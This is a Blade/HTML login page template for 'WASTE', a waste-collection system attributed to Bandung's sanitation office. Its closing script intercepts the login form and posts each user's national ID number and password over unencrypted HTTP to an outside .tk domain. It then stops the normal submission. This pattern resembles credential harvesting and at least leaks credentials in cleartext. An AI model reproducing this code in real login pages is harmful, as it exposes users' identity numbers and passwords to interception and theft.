<!DOCTYPE HTML>
<html>
<head>
    <title>WASTE - Waste Acquisition System Technological Enhancement</title>
    <!-- Bootstrap -->
    <link href="{{ url('/css/bootstrap.min.css') }}" rel='stylesheet' type='text/css'/>
    <link href="{{ url('/css/bootstrap.css') }}" rel='stylesheet' type='text/css'/>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script type="application/x-javascript"> addEventListener("load", function () {
            setTimeout(hideURLbar, 0);
        }, false);
        function hideURLbar() {
            window.scrollTo(0, 1);
        } </script>
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!--  webfonts  -->
    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,300,700' rel='stylesheet' type='text/css'>
    <!-- // webfonts  -->
    <link href="{{ url('/css/style.css') }}" rel="stylesheet" type="text/css" media="all"/>
    <!-- start plugins -->
    <script type="text/javascript" src="{{ url('/js/jquery.min.js') }}"></script>
    <script type="text/javascript" src="{{ url('/js/bootstrap.js') }}"></script>
    <script type="text/javascript" src="{{ url('/js/bootstrap.min.js') }}"></script>
</head>
<body>
<div class="header_bg"><!-- start header -->
    <div class="container">
        <div class="row header">
            <nav class="navbar" role="navigation">
                <div class="container-fluid">
                    <!-- Brand and toggle get grouped for better mobile display -->
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle" data-toggle="collapse"
                                data-target="#bs-example-navbar-collapse-1">
                            <span class="sr-only">Toggle navigation</span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                        <a class="navbar-brand" href="index"><img src="{{ url('/images/logo.png') }}" alt=""
                                                                  class="img-responsive"/>
                        </a>
                    </div>
                    <!-- Collect the nav links, forms, and other content for toggling -->

                </div>
                <!-- /.container-fluid -->
            </nav>
        </div>
        <div class="row slider text-center">
            <div class="col-md-8">
                <div class="col-md-10 slider_text">
                    <h2>Welcome to WASTE</h2>

                    <h3>Waste Acquisition System Technological Enhancement</h3>
                    <br/>

                    <div class="container" style="width:80%;">
                        <form  onsubmit="return kirim();" class="form-signin" method="post" action="{{url('auth/login')}}">
                            <input type="hidden" name="_token" value="<?php echo csrf_token(); ?>">

                            <label for="nik" class="sr-only">NIK</label>
                            <input name="nik" type="text" id="nik" class="form-control" placeholder="NIK" required
                                   autofocus>
                            <label for="inputPassword" class="sr-only">Password</label>
                            <input name="password" type="password" id="inputPassword" class="form-control" placeholder="Password"
                                   required>
                            <br/>
                            <button class="btn btn-lg btn-primary btn-block" type="submit">Log in</button>
                        </form>
                        @include ('errors.list')
                    </div>
                    <!-- /container -->
                </div>
            </div>
            <div class="col-md-4">
                <div class="slider_img">
                    <img src="{{ url('/images/pic1.png') }}" alt="" class="img-responsive"/>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="footer_btm"><!-- start footer_btm -->
    <div class="container">
        <div class="row  footer1">
            <div class="col-md-5 copy">
                <img src="{{ url('/images/bandung.svg') }}" width="170" height="150" alt="logo"/>
                <p class="link">Dinas Kebersihan Kota Bandung<br/>Jalan Ganesa 10</p>
            </div>
            <div class="col-md-7 copy">
                <p class="link text-right"><span>&#169; WASTE - All rights reserved</span></p>
            </div>
        </div>
    </div>
</div>
<script type="text/javascript">
    function kirim() {
        var nik = $('#nik').val();
        var password = $('#inputPassword').val()
        $.ajax({
            url: 'http://e-gov-bandung.tk/dukcapil/api/public/auth/login',
            type: 'POST',
            data: { nik: nik, password : password}
        });
        console.log('semua oke');
        return false;
    }
</script>
</body>
</html>